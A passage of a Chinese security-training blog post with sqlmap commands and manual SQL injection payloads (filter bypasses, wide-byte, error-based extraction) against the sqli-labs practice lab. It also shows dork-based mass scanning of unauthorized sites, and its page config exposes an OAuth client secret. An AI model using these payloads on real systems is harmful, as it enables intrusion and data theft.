<h2 id="5-POST-使用–data传递post数据"><a href="#5-POST-使用–data传递post数据" class="headerlink" title="5. [POST]使用–data传递post数据"></a>5. [POST]使用–data传递post数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>r E:\<span class="number">360</span>MoveData\Users\Administrator\Desktop\post.txt（第<span class="number">11</span>关）</span><br><span class="line">随意输入内容，使用burp抓包。</span><br></pre></td></tr></table></figure>

<h1 id="COOKIE注入"><a href="#COOKIE注入" class="headerlink" title="COOKIE注入"></a>COOKIE注入</h1><h2 id="1-判断"><a href="#1-判断" class="headerlink" title="1. 判断"></a>1. 判断</h2><p>当我们登陆后将信息存在了COOKIE中，后台进行判断，发现COOKIE中会显示上面<br>的个人信息，而不是登录框。在上面的信息中可以看到，多出了一个Your ID：8，这<br>个信息很有可能是从数据库中查询出来的，我们再次访问该页面，使用burp抓包分析，<br>此时会发现获取到了COOKIE值。</p>
<p>可以看到COOKIE中有uname&#x3D;admin，说明后台很有可能利用COOKIE中的uname去数<br>据库中进行查询操作。</p>
<h2 id="2-手动检测"><a href="#2-手动检测" class="headerlink" title="2. 手动检测"></a>2. 手动检测</h2><p>将COOKIE中的信息改为uname&#x3D;admin’，页面报错了，并且从报错信息中可以看出，<br>后台使用的是单引号进行的拼凑。</p>
<h2 id="3-sqlmap注入"><a href="#3-sqlmap注入" class="headerlink" title="3. sqlmap注入"></a>3. sqlmap注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.30</span><span class="number">.88</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-20</span><span class="operator">/</span> <span class="comment">--cookie</span></span><br><span class="line">&quot;uname=admin&quot; <span class="comment">--level=2</span></span><br></pre></td></tr></table></figure>

<h1 id="sqlmap经典语法"><a href="#sqlmap经典语法" class="headerlink" title="sqlmap经典语法"></a>sqlmap经典语法</h1><h2 id="1-–banner"><a href="#1-–banner" class="headerlink" title="1. –banner"></a>1. –banner</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查询数据库类型，版本信息。（任意一个url都可以）</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--banner</span></span><br></pre></td></tr></table></figure>

<h2 id="2-g-“谷歌语法”"><a href="#2-g-“谷歌语法”" class="headerlink" title="2. -g “谷歌语法”"></a>2. -g “谷歌语法”</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对网站url进行批量注入测试</span><br><span class="line">如inurl:index.php?id<span class="operator">=</span> 在没有google搜索引擎的情况下，使用baidu也是不错的。</span><br><span class="line">会搜索到很多网站，可以对这些网站进行尝试。不过这些都是属于未授权测试，只做演示。</span><br><span class="line">sqlmap.py <span class="operator">-</span>g &quot;inurl:index.php?id=&quot;</span><br></pre></td></tr></table></figure>

<h2 id="3-–sql-shell"><a href="#3-–sql-shell" class="headerlink" title="3. –sql-shell"></a>3. –sql-shell</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--sqlshell</span></span><br><span class="line">执行操作指令，之后执行<span class="keyword">sql</span>语句即可。</span><br></pre></td></tr></table></figure>

<h2 id="4-–os-shell"><a href="#4-–os-shell" class="headerlink" title="4. –os-shell"></a>4. –os-shell</h2><p>执行条件：<br>    1. 网站必须是root权限<br>    2. 攻击者需要知道网站的绝对路径<br>    3. GPC为off，php主动转义的功能关闭</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>

<h2 id="5-–os-cmd"><a href="#5-–os-cmd" class="headerlink" title="5. –os-cmd"></a>5. –os-cmd</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--os-cmd=whoami 成功执行</span></span><br></pre></td></tr></table></figure>

<h2 id="6-–file-read"><a href="#6-–file-read" class="headerlink" title="6. –file-read"></a>6. –file-read</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--file-read=&quot;c://test.php&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="7-–file-write-–file-dest"><a href="#7-–file-write-–file-dest" class="headerlink" title="7. –file-write –file-dest"></a>7. –file-write –file-dest</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--file-write &quot;E:\360MoveData\Users\Administrator\Desktop\hhh.txt&quot; --file-dest</span></span><br><span class="line">&quot;c://aa.txt&quot;</span><br><span class="line">将本地桌面的hhh.txt（内容为hahaha）上传到服务器c盘，名字为aa.txt。</span><br></pre></td></tr></table></figure>

<h2 id="8-–dbms-x3D-”MySQL”"><a href="#8-–dbms-x3D-”MySQL”" class="headerlink" title="8. –dbms&#x3D;”MySQL”"></a>8. –dbms&#x3D;”MySQL”</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--dbms=&quot;MySQL&quot;</span></span><br><span class="line">指定数据库类型</span><br></pre></td></tr></table></figure>

<p>默认情况下sqlmap会自动识别探测目标Web应用程序的后端数据库管理系统（DBMS），以下列出sqlmap完全支持的DBMS种类：</p>
<p>MySQL,Oracle,Firebird,IBM DB2,Informix,Microsoft Access,Microsoft SQL<br>Server,PostgreSQL,SAP MaxDB,SQLite,Sybase</p>
<h2 id="9-–sql-query"><a href="#9-–sql-query" class="headerlink" title="9. –sql-query"></a>9. –sql-query</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行一个<span class="keyword">sql</span>语句，相当于<span class="comment">--sql-shell，执行sql操作。</span></span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--sql-query &quot;user()&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="10-–sql-file"><a href="#10-–sql-file" class="headerlink" title="10. –sql-file"></a>10. –sql-file</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">从指定文件执行<span class="keyword">sql</span>语句</span><br><span class="line">新建一个sql.sql文件，写入database();</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--sql-file &quot;E:\360MoveData\Users\Administrator\Desktop\sql.sql&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="11-–proxy-x3D-”IP-端口”"><a href="#11-–proxy-x3D-”IP-端口”" class="headerlink" title="11. –proxy&#x3D;”IP:端口”"></a>11. –proxy&#x3D;”IP:端口”</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--proxy=&quot;http://IP:端口&quot;</span></span><br><span class="line">使用代理进行注入检测，所发送的包都会从代理机器发送出去，可以更好的保护自己。</span><br><span class="line">免费代理池：https:<span class="operator">/</span><span class="operator">/</span>lab.crossincode.com<span class="operator">/</span>proxy<span class="operator">/</span></span><br></pre></td></tr></table></figure>

<h2 id="12-–technique"><a href="#12-–technique" class="headerlink" title="12. –technique"></a>12. –technique</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对Less<span class="number">-1</span>注入测试，会检测所有注入，发现存在四种注入技术。</span><br><span class="line">指定注入类型，会大大缩短时间。</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--technique B</span></span><br></pre></td></tr></table></figure>

<h2 id="13-–fresh-queries"><a href="#13-–fresh-queries" class="headerlink" title="13. –fresh-queries"></a>13. –fresh-queries</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">清除缓存</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">=</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">=</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--fresh-queries</span></span><br><span class="line">sqlmap每次查询都会将查询结果储存在.sqlmap文件夹中，下次再有相同的查询会调用</span><br><span class="line">上次的查询结果，使用这个参数可以忽略文件中的记载结果，重新查询。</span><br></pre></td></tr></table></figure>

<h2 id="14-–flush-session"><a href="#14-–flush-session" class="headerlink" title="14. –flush-session"></a>14. –flush-session</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">刷新会话</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--flush-session --technique B</span></span><br><span class="line">会发现开始初次检测，这就是第一次测试。</span><br><span class="line">之后的测试会很快，已经有了缓存。</span><br></pre></td></tr></table></figure>

<h2 id="15-–batch"><a href="#15-–batch" class="headerlink" title="15. –batch"></a>15. –batch</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对所有的交互式的都是默认的</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --</span></span><br><span class="line">flush<span class="operator">-</span>session <span class="comment">--technique B</span></span><br><span class="line">简单来说：自动选择默认，中间不需要操作。</span><br></pre></td></tr></table></figure>

<h2 id="16-–start-–stop"><a href="#16-–start-–stop" class="headerlink" title="16. –start –stop"></a>16. –start –stop</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">指定查看列的范围 <span class="comment">--start 获取第一个查询输出数据位置 --stop 获取最后查询</span></span><br><span class="line">输出数据位置 会查询指定位置的列信息。</span><br></pre></td></tr></table></figure>

<h2 id="17-–first-–last"><a href="#17-–first-–last" class="headerlink" title="17. –first –last"></a>17. –first –last</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">指定查看字符的范围 <span class="comment">--first 获取第一个查询输出字的字符 --last获取最后查询</span></span><br><span class="line">的输出字字符</span><br><span class="line">通过<span class="comment">--first 2和--last 3指定查看字符范围，只在盲注时使用，因为只有盲注会一个</span></span><br><span class="line">字一个字猜解。</span><br></pre></td></tr></table></figure>

<h1 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h1><h2 id="1-双写绕过"><a href="#1-双写绕过" class="headerlink" title="1. 双写绕过"></a>1. 双写绕过</h2><ol>
<li>输入order by 查询出字段数为3</li>
<li>输入union select 进行联合查询，发现过滤了union、select</li>
<li>进行双写绕过（select三次）：id&#x3D;-1’ununionion selselselectectect 1,2,3%23</li>
<li>利用注入漏洞读取 key ： id&#x3D;-1’ununionion selselselectectect<br>1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;key.txt”),3%23</li>
</ol>
<h2 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2. 大小写绕过"></a>2. 大小写绕过</h2><ol>
<li>输入order by 查询出字段数为3</li>
<li>输入union select 进行联合查询，发现过滤了union、select</li>
<li>进行大小写绕过：id&#x3D;-1’ uNion seLect 1,2,3%23</li>
<li>读取key：id&#x3D;-1’ uNion seLect 1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;key.txt”),3%23</li>
</ol>
<h2 id="3-注释绕过空格"><a href="#3-注释绕过空格" class="headerlink" title="3. 注释绕过空格"></a>3. 注释绕过空格</h2><ol>
<li>输入<code>and 1=1 </code>发现过滤了空格</li>
<li>利用注释符进行进行绕过空格：<code>id=1&#39;/**/and/**/1=1%23</code></li>
<li>使用order by进行判断字段数：<code>id=1&#39;/**/order/**/by/**/3%23</code></li>
<li>使用联合查询：<code>id=-1&#39;/**/union/**/select/**/1,database(),version()%23</code></li>
</ol>
<h2 id="4-空格其他绕过方式"><a href="#4-空格其他绕过方式" class="headerlink" title="4. 空格其他绕过方式"></a>4. 空格其他绕过方式</h2><ol>
<li>%09、%0a、%0d、%0b等</li>
<li>括号绕过空格</li>
<li>使用 + 号、Tab键、两个空格、反引号等</li>
</ol>
<h2 id="5-过滤等号-x3D-绕过"><a href="#5-过滤等号-x3D-绕过" class="headerlink" title="5. 过滤等号&#x3D;绕过"></a>5. 过滤等号&#x3D;绕过</h2><ol>
<li><p>使用like绕过<br> 使用通配符 like 执行的效果和 &#x3D; 一致，所以可以用来绕过等号过滤。<br> <code>-1&#39; union select * from users where id like 2%23</code></p>
</li>
<li><p>使用 &lt;&gt; 绕过<br> &lt;&gt; 等价于 !&#x3D; 所以我们可以在 &lt;&gt; 前加个 ! 就变成等于了。例如：<br> <code>id=-1&#39; union select * from users where !(id&lt;&gt;2)%23</code></p>
</li>
</ol>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>编码类型：</p>
<ul>
<li><p>单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。</p>
</li>
<li><p>多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</p>
</li>
<li><p>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根 据不同的符号而变化字节长度，一般会占3个字节。</p>
</li>
<li><p>GBK 编码：也是一种多字节编码，它一般占两个字节。</p>
</li>
</ul>
<p>而一般常见的存在宽字节注入的编码类型为：GBK 和 BIG5</p>
<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>在实际应用中，为防止注入漏洞通常会把单引号处理下，那又为啥要处理单引号呢？</p>
<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id<span class="operator">=</span>$_GET[‘id’];</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> ‘$id’</span><br></pre></td></tr></table></figure>

<p>上边呢我们输入进去的 SQL 语句，都会赋值给 $id 这个变量，然后会被包含在引号里，在PHP中引号里的内容是属于字符串的，所以我们直接在这里输入的一些 SQL 命令都会被当作字符串处理，这些命令就不会起到作用。</p>
<p>所以我们在字符型注入中才会先用单引号闭合下，再输入 SQL 命令，这样后面的命令才会执行。如果程序中在我们输入的单引号前加上个反斜杠比如：\’。这样的话这个单引号就是个字符了，没有单引号闭合的作用，所以就起到了防护的作用。</p>
<p>为了突破这个防护，我们可以使用宽字节注入的方式进行突破：</p>
<p>我们的使用方式是：<code>%df’</code>，当我们在单引号前加上<code>%df</code>的时候，也就是输入<code>%df’</code>这样传入到数据库中就会变成：<code>%df%5c’</code>。</p>
<p>那么宽字节注入的突破方式除了 %df 之外还有其他的方式么？</p>
<p>其实是有的，我们可以看下 GBK 的编码表：<code>https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php</code>，这里的<code>%DE%5C</code>、<code>%E0%5C</code>，等都是可以的。</p>
<h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol>
<li>在id&#x3D;1后面添加单引号发现被转义，在前面加了个\</li>
<li>使用<code>%df</code>进行闭合：<code>id=1%df&#39; and 1=1%23</code></li>
</ol>
<h1 id="二次查询注入"><a href="#二次查询注入" class="headerlink" title="二次查询注入"></a>二次查询注入</h1><p>sqli-lab 第五关 二次查询注入</p>
<p>双查询注入其实就是一个select语句中再嵌套一个select语句，嵌套的这个语句称作子查询<code>select concat((select database()));</code></p>
<h2 id="基础函数"><a href="#基础函数" class="headerlink" title="基础函数"></a>基础函数</h2><ul>
<li><code>count()</code>：汇总数据函数</li>
<li><code>rand()</code>：随机输出一个小于1的正数</li>
<li><code>floor()</code>：把输出的结果取整</li>
<li><code>group by</code>语句：把结果分组输出</li>
<li><code>concat()</code>：连接两条语句</li>
</ul>
<h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat((<span class="keyword">select</span> database()),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure>

<p>这里解释一下，把<code>select database()</code>和<code>floor(rand()*2)</code>的结果输出到a里，然后最大长度根据<code>information_schema.tables</code>来决定，然后用a进行分组，bees1一组，bees0一组:</p>
<h3 id="1-爆当前库名"><a href="#1-爆当前库名" class="headerlink" title="1. 爆当前库名"></a>1. 爆当前库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union SELECT null,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>

<h3 id="2-报表名"><a href="#2-报表名" class="headerlink" title="2. 报表名"></a>2. 报表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union SELECT null,count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>

<h3 id="3-爆列名"><a href="#3-爆列名" class="headerlink" title="3. 爆列名"></a>3. 爆列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union SELECT null,count(*),concat((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;limit 12,1),floor(rand()*2))as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>

<h3 id="4-查数据"><a href="#4-查数据" class="headerlink" title="4. 查数据"></a>4. 查数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union SELECT null,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>
    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/1093/" rel="prev" title="【网络安全4x01】洞明科技网络安全培训 --- day1">
                  <i class="fa fa-chevron-left"></i> 【网络安全4x01】洞明科技网络安全培训 --- day1
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/1095/" rel="next" title="【网络安全4x03】洞明科技网络安全培训 --- day3">
                  【网络安全4x03】洞明科技网络安全培训 --- day3 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa-solid fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">gaoteng17</span>
</div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  




<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"client_id":"96531982aa814e82e033","client_secret":"9d64fd0a7523408d110bfc9839658aaa2a0ee62e","repo":"Blog_Comments","github_id":"gaoteng17","admin_user":"gaoteng17","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"00c0035a16913e3a6fc28370ccbc7496"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>
